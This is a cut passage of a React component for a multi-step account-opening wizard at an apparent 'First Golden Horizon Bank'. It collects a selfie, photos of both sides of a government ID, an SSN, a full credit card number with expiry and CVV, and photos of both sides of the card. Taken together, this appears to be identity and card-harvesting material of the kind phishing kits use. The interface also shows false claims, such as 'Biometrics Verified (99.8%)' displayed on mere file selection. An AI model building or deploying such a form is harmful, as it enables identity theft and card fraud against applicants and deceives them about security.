                      className={`form-input ${errors.stateRegion ? 'error' : ''}`}
                      placeholder="e.g. NY"
                      value={formData.stateRegion}
                      onChange={(e) => handleInputChange('stateRegion', e.target.value)}
                    />
                    {errors.stateRegion && <span className="field-error-msg">{errors.stateRegion}</span>}
                  </div>

                  <div>
                    <label className="form-field-label">ZIP / Postal Code *</label>
                    <input
                      type="text"
                      className={`form-input ${errors.postalCode ? 'error' : ''}`}
                      placeholder="e.g. 10001"
                      value={formData.postalCode}
                      onChange={(e) => handleInputChange('postalCode', e.target.value)}
                    />
                    {errors.postalCode && <span className="field-error-msg">{errors.postalCode}</span>}
                  </div>

                  <div>
                    <label className="form-field-label">Country *</label>
                    <select
                      className={`form-dropdown ${errors.country ? 'error' : ''}`}
                      value={formData.country}
                      onChange={(e) => handleInputChange('country', e.target.value)}
                    >
                      <option value="">-- Select Country of Residence --</option>
                      <option value="United States">United States</option>
                      <option value="United Kingdom">United Kingdom</option>
                      <option value="Switzerland">Switzerland</option>
                      <option value="Germany">Germany</option>
                      <option value="Singapore">Singapore</option>
                      <option value="Canada">Canada</option>
                      <option value="Australia">Australia</option>
                    </select>
                    {errors.country && <span className="field-error-msg">{errors.country}</span>}
                  </div>
                </div>
              </div>

              {/* Demographics & Banking Relationship */}
              <div className="account-form-section">
                <h3 className="account-section-title">Demographics, Occupation & Banking Information</h3>
                <div className="account-form-grid">
                  <div>
                    <label className="form-field-label">Marital Status *</label>
                    <select
                      className={`form-dropdown ${errors.maritalStatus ? 'error' : ''}`}
                      value={formData.maritalStatus}
                      onChange={(e) => handleInputChange('maritalStatus', e.target.value)}
                    >
                      <option value="">-- Select Marital Status --</option>
                      <option value="Single">Single</option>
                      <option value="Married">Married</option>
                      <option value="Divorced">Divorced</option>
                      <option value="Widowed">Widowed</option>
                      <option value="Domestic Partnership">Domestic Partnership</option>
                    </select>
                    {errors.maritalStatus && <span className="field-error-msg">{errors.maritalStatus}</span>}
                  </div>

                  <div>
                    <label className="form-field-label">Employment Status *</label>
                    <select
                      className={`form-dropdown ${errors.employmentStatus ? 'error' : ''}`}
                      value={formData.employmentStatus}
                      onChange={(e) => handleInputChange('employmentStatus', e.target.value)}
                    >
                      <option value="">-- Select Employment Status --</option>
                      <option value="Employed Full-Time">Employed Full-Time</option>
                      <option value="Self-Employed / Business Owner">Self-Employed / Business Owner</option>
                      <option value="Executive / C-Suite">Executive / C-Suite</option>
                      <option value="Retired">Retired</option>
                      <option value="Student">Student</option>
                      <option value="Other">Other</option>
                    </select>
                    {errors.employmentStatus && <span className="field-error-msg">{errors.employmentStatus}</span>}
                  </div>

                  <div>
                    <label className="form-field-label">Occupation / Profession *</label>
                    <input
                      type="text"
                      className={`form-input ${errors.occupation ? 'error' : ''}`}
                      placeholder="e.g. Financial Director / Engineer"
                      value={formData.occupation}
                      onChange={(e) => handleInputChange('occupation', e.target.value)}
                    />
                    {errors.occupation && <span className="field-error-msg">{errors.occupation}</span>}
                  </div>

                  <div>
                    <label className="form-field-label">Housing / Residence Type *</label>
                    <select
                      className={`form-dropdown ${errors.housingStatus ? 'error' : ''}`}
                      value={formData.housingStatus}
                      onChange={(e) => handleInputChange('housingStatus', e.target.value)}
                    >
                      <option value="">-- Select Housing / Residence Type --</option>
                      <option value="Homeowner (with mortgage)">Homeowner (with mortgage)</option>
                      <option value="Homeowner (paid in full)">Homeowner (paid in full)</option>
                      <option value="Renting Apartment / House">Renting Apartment / House</option>
                      <option value="Living with family">Living with family</option>
                      <option value="Other">Other</option>
                    </select>
                    {errors.housingStatus && <span className="field-error-msg">{errors.housingStatus}</span>}
                  </div>

                  <div>
                    <label className="form-field-label">Annual Household Income *</label>
                    <select
                      className={`form-dropdown ${errors.annualIncome ? 'error' : ''}`}
                      value={formData.annualIncome}
                      onChange={(e) => handleInputChange('annualIncome', e.target.value)}
                    >
                      <option value="">-- Select Annual Household Income --</option>
                      <option value="Under $50,000">Under $50,000</option>
                      <option value="$50,000 - $100,000">$50,000 - $100,000</option>
                      <option value="$100,000 - $250,000">$100,000 - $250,000</option>
                      <option value="$250,000 - $500,000">$250,000 - $500,000</option>
                      <option value="$500,000+">$500,000+</option>
                    </select>
                    {errors.annualIncome && <span className="field-error-msg">{errors.annualIncome}</span>}
                  </div>

                  <div>
                    <label className="form-field-label">Existing Primary Financial Institution *</label>
                    <select
                      className={`form-dropdown ${errors.primaryExistingBank ? 'error' : ''}`}
                      value={formData.primaryExistingBank}
                      onChange={(e) => handleInputChange('primaryExistingBank', e.target.value)}
                    >
                      <option value="">-- Select Existing Primary Bank --</option>
                      <option value="Chase Bank">Chase Bank (JPMorgan)</option>
                      <option value="Bank of America">Bank of America</option>
                      <option value="Wells Fargo">Wells Fargo</option>
                      <option value="Citigroup">Citigroup</option>
                      <option value="PNC Bank">PNC Bank</option>
                      <option value="Capital One">Capital One</option>
                      <option value="First Golden Horizon Bank">First Golden Horizon Bank (Existing Account)</option>
                      <option value="Other Bank">Other Bank / Credit Union</option>
                    </select>
                    {errors.primaryExistingBank && <span className="field-error-msg">{errors.primaryExistingBank}</span>}

                    {/* Conditional Input When Client Clicks Others */}
                    {formData.primaryExistingBank === 'Other Bank' && (
                      <div style={{ marginTop: '0.65rem' }}>
                        <label className="form-field-label">Please Specify Primary Bank Name *</label>
                        <input
                          type="text"
                          className={`form-input ${errors.primaryExistingBankOther ? 'error' : ''}`}
                          placeholder="e.g. Charles Schwab, Fidelity, Navy Federal, etc."
                          value={formData.primaryExistingBankOther || ''}
                          onChange={(e) => handleInputChange('primaryExistingBankOther', e.target.value)}
                        />
                        {errors.primaryExistingBankOther && <span className="field-error-msg">{errors.primaryExistingBankOther}</span>}
                      </div>
                    )}
                  </div>
                </div>
              </div>

              {/* Navigation Button */}
              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '0.75rem', marginTop: '1.5rem' }}>
                <button type="button" className="btn btn-ghost" onClick={onClose}>
                  Cancel
                </button>
                <button
                  type="button"
                  className="btn btn-primary btn-lg"
                  disabled={isUnderage}
                  onClick={handleNext}
                >
                  <span>Continue</span>
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <line x1="5" y1="12" x2="19" y2="12"></line>
                    <polyline points="12 5 19 12 12 19"></polyline>
                  </svg>
                </button>
              </div>
            </div>
          )}

          {/* STEP 2: Biometric Selfie Photo Upload */}
          {currentStep === 2 && (
            <div className="account-form-section" style={{ padding: '2rem 1.5rem' }}>
              <div style={{ textAlign: 'center', marginBottom: '1.75rem' }}>
                <div style={{
                  width: '54px',
                  height: '54px',
                  borderRadius: '50%',
                  background: 'rgba(99, 102, 241, 0.15)',
                  color: 'var(--accent-blue)',
                  display: 'inline-flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  marginBottom: '0.75rem'
                }}>
                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
                    <circle cx="12" cy="13" r="4"></circle>
                  </svg>
                </div>

                <h3 style={{ fontFamily: 'var(--font-heading)', fontSize: '1.4rem', fontWeight: 800, color: 'var(--text-primary)', marginBottom: '0.5rem' }}>
                  Biometric Selfie Verification
                </h3>

                {/* Explicit Selfie Guidelines */}
                <div style={{
                  background: 'var(--bg-surface-elevated)',
                  border: '1px solid var(--border-card)',
                  borderRadius: 'var(--radius-lg)',
                  padding: '1.25rem',
                  maxWidth: '560px',
                  margin: '0 auto 1.5rem',
                  textAlign: 'left'
                }}>
                  <strong style={{ fontSize: '0.88rem', color: 'var(--accent-primary)', display: 'block', marginBottom: '0.6rem' }}>
                    📋 Mandatory Selfie Instructions:
                  </strong>
                  <ul style={{ listStyle: 'none', display: 'flex', flexDirection: 'column', gap: '0.45rem', fontSize: '0.84rem', color: 'var(--text-secondary)' }}>
                    <li style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                      <span style={{ color: 'var(--accent-primary)' }}>•</span>
                      <strong>Alone in the selfie:</strong> You must be the only person present in the photo.
                    </li>
                    <li style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                      <span style={{ color: 'var(--accent-primary)' }}>•</span>
                      <strong>Faced straight at the camera:</strong> Look directly into the lens with a clear view of your face.
                    </li>
                    <li style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                      <span style={{ color: 'var(--accent-primary)' }}>•</span>
                      <strong>Irrespective of the background:</strong> Any setting or background is acceptable as long as your facial features are visible.
                    </li>
                  </ul>
                </div>
              </div>

              {/* Photo Upload & Preview Box */}
              <div style={{
                maxWidth: '420px',
                margin: '0 auto 1.5rem',
                border: formData.selfieCaptured ? '2px solid var(--status-success)' : '2px dashed var(--border-card)',
                background: 'var(--bg-surface-elevated)',
                borderRadius: 'var(--radius-xl)',
                padding: '1.75rem',
                textAlign: 'center',
                boxShadow: formData.selfieCaptured ? '0 0 25px rgba(16, 185, 129, 0.2)' : 'none'
              }}>
                {formData.selfiePhotoUrl ? (
                  <div>
                    <div style={{
                      width: '180px',
                      height: '180px',
                      borderRadius: '50%',
                      margin: '0 auto 1rem',
                      overflow: 'hidden',
                      border: '3px solid var(--status-success)',
                      boxShadow: '0 8px 20px rgba(0,0,0,0.4)'
                    }}>
                      <img
                        src={formData.selfiePhotoUrl}
                        alt="Applicant Selfie"
                        style={{ width: '100%', height: '100%', objectFit: 'cover' }}
                      />
                    </div>

                    <span style={{ color: 'var(--status-success)', fontSize: '0.85rem', fontWeight: 700, display: 'block', marginBottom: '0.35rem' }}>
                      ✓ Selfie Photo Uploaded & Biometrics Verified (99.8%)
                    </span>
                    <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'block', marginBottom: '1rem' }}>
                      File: {formData.selfieFileName || 'selfie_image.jpg'}
                    </span>
                  </div>
                ) : (
                  <div>
                    <div style={{
                      width: '120px',
                      height: '120px',
                      borderRadius: '50%',
                      margin: '0 auto 1rem',
                      background: 'var(--bg-card)',
                      border: '2px dashed var(--border-card)',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      color: 'var(--text-muted)'
                    }}>
                      <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                        <circle cx="12" cy="7" r="4"></circle>
                      </svg>
                    </div>
                    <span style={{ fontSize: '0.88rem', fontWeight: 600, color: 'var(--text-primary)', display: 'block', marginBottom: '0.35rem' }}>
                      Upload Your Selfie Photo
                    </span>
                    <span style={{ fontSize: '0.78rem', color: 'var(--text-muted)', display: 'block', marginBottom: '1.25rem' }}>
                      JPEG, PNG, HEIC up to 15MB
                    </span>
                  </div>
                )}

                {/* Hidden File Input */}
                <input
                  type="file"
                  ref={selfieInputRef}
                  accept="image/*"
                  style={{ display: 'none' }}
                  onChange={(e) => handleFileUpload(e, 'selfie')}
                />

                <div style={{ display: 'flex', justifyContent: 'center', gap: '0.75rem' }}>
                  <button
                    type="button"
                    className="btn btn-primary"
                    onClick={() => selfieInputRef.current?.click()}
                  >
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                      <polyline points="17 8 12 3 7 8"></polyline>
                      <line x1="12" y1="3" x2="12" y2="15"></line>
                    </svg>
                    <span>{formData.selfieCaptured ? 'Change Selfie Photo' : 'Choose Selfie Photo File'}</span>
                  </button>
                </div>
              </div>

              {errors.selfie && (
                <div style={{ color: 'var(--status-error)', fontSize: '0.82rem', textAlign: 'center', marginBottom: '1rem' }}>
                  {errors.selfie}
                </div>
              )}

              <div style={{ display: 'flex', justifyContent: 'space-between', borderTop: '1px solid var(--border-subtle)', paddingTop: '1.25rem' }}>
                <button type="button" className="btn btn-ghost" onClick={handleBack}>
                  ‹ Back
                </button>
                <button type="button" className="btn btn-primary" onClick={handleNext}>
                  <span>Continue ›</span>
                </button>
              </div>
            </div>
          )}

          {/* STEP 3: Government ID Front & Back Photo Uploads */}
          {currentStep === 3 && (
            <div className="account-form-section">
              <h3 className="account-section-title">Government-Issued Identification Document</h3>
              <p style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', marginBottom: '1.25rem' }}>
                Select your ID document type and upload a clear photo of <strong>BOTH the front and back</strong> of the card for security validation.
              </p>

              {/* ID Type Selector */}
              <div className="account-form-grid" style={{ marginBottom: '1.5rem' }}>
                <div>
                  <label className="form-field-label">Type of Government ID *</label>
                  <select
                    className={`form-dropdown ${errors.idType ? 'error' : ''}`}
                    value={formData.idType}
                    onChange={(e) => handleInputChange('idType', e.target.value)}
                  >
                    <option value="">-- Select Type of Government ID --</option>
                    <option value="Driver's License">Driver's License</option>
                    <option value="National Identity Card">National Identity Card</option>
                    <option value="International Passport">International Passport</option>
                    <option value="State Issued ID Card">State Issued ID Card</option>
                    <option value="Permanent Resident Card">Permanent Resident Card</option>
                  </select>
                  {errors.idType && <span className="field-error-msg">{errors.idType}</span>}
                </div>

                <div>
                  <label className="form-field-label">Issuing Country *</label>
                  <select
                    className="form-dropdown"
                    value={formData.idCountry}
                    onChange={(e) => handleInputChange('idCountry', e.target.value)}
                  >
                    <option value="United States">United States</option>
                    <option value="United Kingdom">United Kingdom</option>
                    <option value="Canada">Canada</option>
                    <option value="Australia">Australia</option>
                    <option value="Singapore">Singapore</option>
                  </select>
                </div>

                <div>
                  <label className="form-field-label">Issuing State / Jurisdiction</label>
                  <input
                    type="text"
                    className="form-input"
                    placeholder="e.g. NY"
                    value={formData.idStateIssued}
                    onChange={(e) => handleInputChange('idStateIssued', e.target.value)}
                  />
                </div>
              </div>

              {/* Hidden File Inputs for Front and Back */}
              <input
                type="file"
                ref={idFrontInputRef}
                accept="image/*"
                style={{ display: 'none' }}
                onChange={(e) => handleFileUpload(e, 'idFront')}
              />
              <input
                type="file"
                ref={idBackInputRef}
                accept="image/*"
                style={{ display: 'none' }}
                onChange={(e) => handleFileUpload(e, 'idBack')}
              />

              {/* Dual Photo Upload Spaces: Front & Back */}
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '1.25rem', marginBottom: '1.5rem' }}>
                {/* Front Photo Card */}
                <div style={{
                  border: formData.idFrontScanned ? '2px solid var(--status-success)' : '2px dashed var(--border-card)',
                  background: 'var(--bg-surface-elevated)',
                  borderRadius: 'var(--radius-lg)',
                  padding: '1.5rem',
                  textAlign: 'center'
                }}>
                  <strong style={{ fontSize: '0.92rem', color: 'var(--text-primary)', display: 'block', marginBottom: '0.35rem' }}>
                    Front of {formData.idType} *
                  </strong>
                  <p style={{ fontSize: '0.78rem', color: 'var(--text-muted)', marginBottom: '1rem' }}>
                    Photo, full legal name, and expiration date must be fully visible.
                  </p>

                  {formData.idFrontPhotoUrl ? (
                    <div style={{ marginBottom: '1rem' }}>
                      <img
                        src={formData.idFrontPhotoUrl}
                        alt="Front of ID"
                        style={{ width: '100%', maxHeight: '140px', objectFit: 'cover', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-subtle)', marginBottom: '0.4rem' }}
                      />
                      <span style={{ color: 'var(--status-success)', fontSize: '0.8rem', fontWeight: 600, display: 'block' }}>
                        ✓ Front Photo Selected ({formData.idFrontFileName})
                      </span>
                    </div>
                  ) : (
                    <div style={{ padding: '1.5rem 0', color: 'var(--text-muted)' }}>
                      <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" style={{ margin: '0 auto 0.5rem', display: 'block' }}>
                        <rect x="3" y="4" width="18" height="16" rx="2" ry="2"></rect>
                        <line x1="7" y1="8" x2="17" y2="8"></line>
                        <line x1="7" y1="12" x2="13" y2="12"></line>
                      </svg>
                      <span style={{ fontSize: '0.78rem' }}>No front photo selected</span>
                    </div>
                  )}

                  <button
                    type="button"
                    className="btn btn-primary btn-sm"
                    onClick={() => idFrontInputRef.current?.click()}
                  >
                    {formData.idFrontScanned ? 'Change Front Photo' : 'Upload Front of ID Photo'}
                  </button>
                </div>

                {/* Back Photo Card */}
                <div style={{
                  border: formData.idBackScanned ? '2px solid var(--status-success)' : '2px dashed var(--border-card)',
                  background: 'var(--bg-surface-elevated)',
                  borderRadius: 'var(--radius-lg)',
                  padding: '1.5rem',
                  textAlign: 'center'
                }}>
                  <strong style={{ fontSize: '0.92rem', color: 'var(--text-primary)', display: 'block', marginBottom: '0.35rem' }}>
                    Back of {formData.idType} *
                  </strong>
                  <p style={{ fontSize: '0.78rem', color: 'var(--text-muted)', marginBottom: '1rem' }}>
                    Ensure the 2D PDF417 barcode or magnetic stripe is glare-free.
                  </p>

                  {formData.idBackPhotoUrl ? (
                    <div style={{ marginBottom: '1rem' }}>
                      <img
                        src={formData.idBackPhotoUrl}
                        alt="Back of ID"
                        style={{ width: '100%', maxHeight: '140px', objectFit: 'cover', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-subtle)', marginBottom: '0.4rem' }}
                      />
                      <span style={{ color: 'var(--status-success)', fontSize: '0.8rem', fontWeight: 600, display: 'block' }}>
                        ✓ Back Photo Selected ({formData.idBackFileName})
                      </span>
                    </div>
                  ) : (
                    <div style={{ padding: '1.5rem 0', color: 'var(--text-muted)' }}>
                      <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" style={{ margin: '0 auto 0.5rem', display: 'block' }}>
                        <rect x="3" y="4" width="18" height="16" rx="2" ry="2"></rect>
                        <line x1="7" y1="16" x2="17" y2="16"></line>
                        <line x1="7" y1="12" x2="17" y2="12"></line>
                      </svg>
                      <span style={{ fontSize: '0.78rem' }}>No back photo selected</span>
                    </div>
                  )}

                  <button
                    type="button"
                    className="btn btn-primary btn-sm"
                    onClick={() => idBackInputRef.current?.click()}
                  >
                    {formData.idBackScanned ? 'Change Back Photo' : 'Upload Back of ID Photo'}
                  </button>
                </div>
              </div>

              {errors.idScan && (
                <div style={{ color: 'var(--status-error)', fontSize: '0.82rem', textAlign: 'center', marginBottom: '1rem' }}>
                  {errors.idScan}
                </div>
              )}

              <div style={{ display: 'flex', justifyContent: 'space-between', borderTop: '1px solid var(--border-subtle)', paddingTop: '1.25rem' }}>
                <button type="button" className="btn btn-ghost" onClick={handleBack}>
                  ‹ Back
                </button>
                <button type="button" className="btn btn-primary" onClick={handleNext}>
                  <span>Continue ›</span>
                </button>
              </div>
            </div>
          )}

          {/* STEP 4: Tax ID (SSN / TIN) */}
          {currentStep === 4 && (
            <div className="account-form-section" style={{ maxWidth: '600px', margin: '0 auto' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', marginBottom: '1rem' }}>
                <div style={{ width: '38px', height: '38px', borderRadius: 'var(--radius-md)', background: 'rgba(16, 185, 129, 0.15)', color: 'var(--accent-primary)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                  </svg>
                </div>
                <div>
                  <h3 style={{ fontFamily: 'var(--font-heading)', fontSize: '1.2rem', fontWeight: 800, color: 'var(--text-primary)', margin: 0 }}>
                    Tax Identification (SSN / TIN)
                  </h3>
                  <span style={{ fontSize: '0.74rem', color: 'var(--text-muted)' }}>
                    USA PATRIOT Act & FinCEN CIP Compliance
                  </span>
                </div>
              </div>

              <div className="callout-box info" style={{ marginBottom: '1.5rem', padding: '0.85rem' }}>
                <div style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', lineHeight: 1.45 }}>
                  Federal banking laws require all financial institutions to obtain and verify a valid Taxpayer Identification Number prior to opening any deposit, treasury, or investment account.
                </div>
              </div>

              <div style={{ marginBottom: '1.25rem' }}>
                <label className="form-field-label">Tax ID Classification *</label>
                <select
                  className={`form-dropdown ${errors.taxIdType ? 'error' : ''}`}
                  value={formData.taxIdType}
                  onChange={(e) => handleInputChange('taxIdType', e.target.value)}
                >
                  <option value="">-- Select Tax ID Classification --</option>
                  <option value="Social Security Number (SSN)">Social Security Number (SSN)</option>
                  <option value="Individual Taxpayer ID Number (ITIN)">Individual Taxpayer ID Number (ITIN)</option>
                  <option value="Employer Identification Number (EIN)">Employer Identification Number (EIN)</option>
                </select>
                {errors.taxIdType && <span className="field-error-msg">{errors.taxIdType}</span>}
              </div>

              <div style={{ marginBottom: '1.5rem' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.35rem' }}>
                  <label className="form-field-label" style={{ margin: 0 }}>Social Security Number (9 Digits) *</label>
                  <button
                    type="button"
                    className="btn btn-ghost btn-xs"
                    onClick={() => handleInputChange('showSsn', !formData.showSsn)}
                    style={{ fontSize: '0.72rem', padding: '0.1rem 0.4rem' }}
                  >
                    {formData.showSsn ? 'Mask' : 'Reveal'}
                  </button>
                </div>
                <input
                  type={formData.showSsn ? 'text' : 'password'}
                  className={`form-input ${errors.ssn ? 'error' : ''}`}
                  placeholder="XXX-XX-XXXX"
                  maxLength={11}
                  value={formData.ssn}
                  onChange={handleSsnChange}
                  style={{ letterSpacing: '0.15em', fontFamily: 'monospace', fontSize: '1.05rem' }}
                />
                {errors.ssn && <span className="field-error-msg">{errors.ssn}</span>}
              </div>

              <div style={{ background: 'var(--bg-surface-elevated)', padding: '0.75rem 1rem', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-subtle)', marginBottom: '1.5rem', display: 'flex', alignItems: 'center', gap: '0.5rem', fontSize: '0.75rem', color: 'var(--accent-primary)' }}>
                <span>🔒 256-Bit Hardware Security Module (HSM) Tokenized</span>
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', borderTop: '1px solid var(--border-subtle)', paddingTop: '1.25rem' }}>
                <button type="button" className="btn btn-ghost" onClick={handleBack}>
                  ‹ Back
                </button>
                <button type="button" className="btn btn-primary" onClick={handleNext}>
                  <span>Continue ›</span>
                </button>
              </div>
            </div>
          )}

          {/* STEP 5: Credit Card Verification & Issuing Bank Match (No 3D Card Graphic) */}
          {currentStep === 5 && (
            <div className="account-form-section">
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', marginBottom: '1rem' }}>
                <div style={{ width: '38px', height: '38px', borderRadius: 'var(--radius-md)', background: 'linear-gradient(135deg, #0284c7 0%, #0369a1 100%)', color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
                    <line x1="1" y1="10" x2="23" y2="10"></line>
                  </svg>
                </div>
                <div>
                  <h3 style={{ fontFamily: 'var(--font-heading)', fontSize: '1.2rem', fontWeight: 800, color: 'var(--text-primary)', margin: 0 }}>
                    Credit Card Verification & Issuing Bank Match
                  </h3>
                  <span style={{ fontSize: '0.74rem', color: 'var(--text-muted)' }}>
                    Active Card Verification • Front & Back Photos Required • No Expired Cards Accepted
                  </span>
                </div>
              </div>

              <p style={{ fontSize: '0.84rem', color: 'var(--text-secondary)', marginBottom: '1.5rem', lineHeight: '1.45' }}>
                Please specify the issuing bank of your credit card, enter card details, and upload photos of both the front and back of the card to verify active account ownership.
              </p>

              {/* Form Input fields */}
              <div className="account-form-grid" style={{ marginBottom: '1.5rem' }}>
                <div>
                  <label className="form-field-label">What Bank is this Card From? *</label>
                  <select
                    className={`form-dropdown ${errors.cardIssuingBank ? 'error' : ''}`}
                    value={formData.cardIssuingBank}
                    onChange={(e) => handleInputChange('cardIssuingBank', e.target.value)}
                  >
                    <option value="">-- Select Card Issuing Bank --</option>
                    <option value="Chase Bank">Chase Bank (JPMorgan)</option>
                    <option value="Bank of America">Bank of America</option>
                    <option value="Wells Fargo">Wells Fargo</option>
                    <option value="Citibank">Citibank</option>
                    <option value="Capital One">Capital One</option>
                    <option value="First Golden Horizon Bank">First Golden Horizon Bank</option>
                    <option value="American Express Centurion Bank">American Express</option>
                    <option value="Discover Bank">Discover Bank</option>
                    <option value="Barclays Bank">Barclays Bank</option>
                    <option value="PNC Bank">PNC Bank</option>
                    <option value="US Bank">US Bank</option>
                    <option value="Other Bank / Credit Union">Other Bank / Credit Union</option>
                  </select>
                  {errors.cardIssuingBank && <span className="field-error-msg">{errors.cardIssuingBank}</span>}
                </div>

                <div>
                  <label className="form-field-label">Card Network *</label>
                  <select
                    className={`form-dropdown ${errors.cardNetwork ? 'error' : ''}`}
                    value={formData.cardNetwork}
                    onChange={(e) => handleInputChange('cardNetwork', e.target.value)}
                  >
                    <option value="">-- Select Card Network --</option>
                    <option value="Visa">Visa</option>
                    <option value="Mastercard">Mastercard</option>
                    <option value="American Express">American Express</option>
                    <option value="Discover">Discover</option>
                  </select>
                  {errors.cardNetwork && <span className="field-error-msg">{errors.cardNetwork}</span>}
                </div>

                <div>
                  <label className="form-field-label">Cardholder Name (Matches Applicant) *</label>
                  <input
                    type="text"
                    className="form-input"
                    placeholder="Client First and Last Name"
                    value={formData.cardholderName || `${formData.firstName || ''} ${formData.lastName || ''}`.trim()}
                    onChange={(e) => handleInputChange('cardholderName', e.target.value)}
                  />
                </div>

                <div>
                  <label className="form-field-label">Card Number (16 Digits) *</label>
                  <input
                    type="text"
                    className={`form-input ${errors.card ? 'error' : ''}`}
                    placeholder="4000 1234 5678 9010"
                    maxLength={19}
                    value={formData.cardNumberMasked}
                    onChange={handleCardNumberChange}
                  />
                  {errors.card && <span className="field-error-msg">{errors.card}</span>}
                </div>

                <div>
                  <label className="form-field-label">Expiration Date (MM/YY) - Active Only *</label>
                  <input
                    type="text"
                    className={`form-input ${errors.cardExp ? 'error' : ''}`}
                    placeholder="MM/YY"
                    maxLength={5}
                    value={formData.cardExp}
                    onChange={handleExpChange}
                  />
                  {errors.cardExp && <span className="field-error-msg">{errors.cardExp}</span>}
                </div>

                <div>
                  <label className="form-field-label">Security Code (CVV/CVC) *</label>
                  <input
                    type="password"
                    className={`form-input ${errors.cardCvv ? 'error' : ''}`}
                    placeholder="•••"
                    maxLength={4}
                    value={formData.cardCvv}
                    onChange={(e) => handleInputChange('cardCvv', e.target.value.replace(/\D/g, ''))}
                  />
                  {errors.cardCvv && <span className="field-error-msg">{errors.cardCvv}</span>}
                </div>
              </div>

              {/* Hidden File Inputs for Card Front & Back */}
              <input
                type="file"
                ref={cardFrontInputRef}
                accept="image/*"
                style={{ display: 'none' }}
                onChange={(e) => handleFileUpload(e, 'cardFront')}
              />
              <input
                type="file"
                ref={cardBackInputRef}
                accept="image/*"
                style={{ display: 'none' }}
                onChange={(e) => handleFileUpload(e, 'cardBack')}
              />

              {/* Dual Card Photo Upload Section: Front & Back */}
              <div style={{ marginBottom: '1.5rem' }}>
                <strong style={{ fontSize: '0.9rem', color: 'var(--text-primary)', display: 'block', marginBottom: '0.75rem' }}>
                  📷 Credit Card Verification Photos (Front & Back) *
                </strong>

                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))', gap: '1.25rem' }}>
                  {/* Front of Card */}
                  <div style={{
                    border: formData.cardFrontPhotoUrl ? '2px solid var(--status-success)' : '2px dashed var(--border-card)',
                    background: 'var(--bg-surface-elevated)',
                    borderRadius: 'var(--radius-lg)',
                    padding: '1.25rem',
                    textAlign: 'center'
                  }}>
                    <span style={{ fontSize: '0.85rem', fontWeight: 700, color: 'var(--text-primary)', display: 'block', marginBottom: '0.35rem' }}>
                      Front of Credit Card *
                    </span>
                    <p style={{ fontSize: '0.76rem', color: 'var(--text-muted)', marginBottom: '0.75rem' }}>
                      Cardholder name and expiration date must be visible.
                    </p>

                    {formData.cardFrontPhotoUrl ? (
                      <div style={{ marginBottom: '0.75rem' }}>
                        <img
                          src={formData.cardFrontPhotoUrl}
                          alt="Front of Credit Card"
                          style={{ width: '100%', maxHeight: '120px', objectFit: 'cover', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-subtle)', marginBottom: '0.3rem' }}
                        />
                        <span style={{ color: 'var(--status-success)', fontSize: '0.78rem', fontWeight: 600, display: 'block' }}>
                          ✓ Front Photo Uploaded ({formData.cardFrontFileName})
                        </span>
                      </div>
                    ) : (
                      <div style={{ padding: '1rem 0', color: 'var(--text-muted)' }}>
                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" style={{ margin: '0 auto 0.35rem', display: 'block' }}>
                          <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
                          <line x1="1" y1="10" x2="23" y2="10"></line>
                        </svg>
                        <span style={{ fontSize: '0.76rem' }}>No front photo uploaded</span>
                      </div>
                    )}

                    <button
                      type="button"
                      className="btn btn-primary btn-sm"
                      onClick={() => cardFrontInputRef.current?.click()}
                    >
                      {formData.cardFrontPhotoUrl ? 'Change Front Photo' : 'Upload Front of Card'}
                    </button>
                  </div>

                  {/* Back of Card */}
                  <div style={{
                    border: formData.cardBackPhotoUrl ? '2px solid var(--status-success)' : '2px dashed var(--border-card)',
                    background: 'var(--bg-surface-elevated)',
